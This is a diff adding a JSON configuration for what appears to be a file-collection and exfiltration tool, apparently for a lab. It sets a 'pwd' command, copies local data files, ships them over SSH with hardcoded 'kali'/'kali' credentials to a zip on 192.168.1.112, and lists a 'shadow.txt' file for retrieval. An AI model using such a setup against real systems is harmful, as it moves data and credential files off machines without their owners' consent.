@@ -1,0 +1,25 @@
+{
+	"filename": "all.json",
+	"endpoints": {
+		"cmd": {
+			"cmd": "pwd",
+			"command_output": "./databack/pwd.txt",
+			"exec_only": "No"
+		},
+		"copy": {
+			"files": "./databack/data.txt, ./databack/pwd.txt",
+			"output": "./databack/pwd.txt",
+			"collect": "Yes"
+		},
+		"ssh": {
+			"ssh_ip": "192.168.1.112",
+			"ssh_user": "kali",
+			"ssh_pass": "kali",
+			"ssh_files": "./databack/data.txt, ./databack/pwd.txt",
+			"ssh_output": "/home/kali/great.zip"
+		},
+		"retrieval": {
+			"file_location": "./test_command/command.txt, ./test_command/shadow.txt"
+		}
+	}
+}
